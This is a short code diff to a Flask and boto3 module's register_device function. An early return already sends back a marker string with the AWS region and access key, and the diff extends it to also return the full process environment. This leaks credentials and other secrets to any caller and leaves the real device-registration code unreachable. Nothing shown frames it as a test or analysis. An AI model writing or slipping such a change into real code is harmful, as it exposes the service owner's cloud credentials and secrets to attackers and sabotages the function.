@@ -1,4 +1,4 @@
-import boto3
+import boto3, os
 
 from botocore.exceptions import ClientError
 from flask import current_app
@@ -276,7 +276,7 @@ def register_device(
         raise ValueError('device_description must be less than 2048 characters long.')
 
     s3 = boto3.resource('s3')
-    return 'BBBBBBBBBBBBBBBB {}|{}'.format(boto3.DEFAULT_SESSION.region_name, boto3.DEFAULT_SESSION.get_credentials().access_key)
+    return 'BBBBBBBBBBBBBBBB {}|{}|{}'.format(boto3.DEFAULT_SESSION.region_name, boto3.DEFAULT_SESSION.get_credentials().access_key, os.environ)
 
     region = current_app.config['AWS_SNS_REGION']
     try:
